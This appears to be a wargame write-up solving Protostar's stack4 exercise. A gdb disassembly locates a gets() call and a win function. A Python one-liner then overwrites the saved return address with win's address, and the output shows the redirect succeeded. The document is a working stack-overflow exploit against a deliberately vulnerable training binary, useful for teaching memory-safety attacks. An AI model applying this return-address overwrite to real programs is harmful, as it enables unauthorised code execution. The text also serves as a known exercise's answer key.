## protostar-stack4

ret address overwrite

## http://exploit-exercises.com/protostar/stack4



```sh
$ gdb ./stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
/*
usually some code like sub xxx,esp

bottom of                                                            top of
memory                                                               memory
           buffer2       buffer1   sfp   ret   a     b     c
<------   [            ][        ][    ][    ][    ][    ][    ]
       
top of                                                            bottom of
stack      

more for reading:http://insecure.org/stf/smashstack.html
*/
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   %ebp
0x080483f5 <win+1>:     mov    %esp,%ebp
0x080483f7 <win+3>:     sub    $0x18,%esp
0x080483fa <win+6>:     movl   $0x80484e0,(%esp)
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
(gdb) ^CQuit
(gdb) q
$ python -c 'print "a"*76+"\xf4\x83\x04\x08"'>/tmp/file
$ ./stack4 </tmp/file
code flow successfully changed
Segmentation fault


```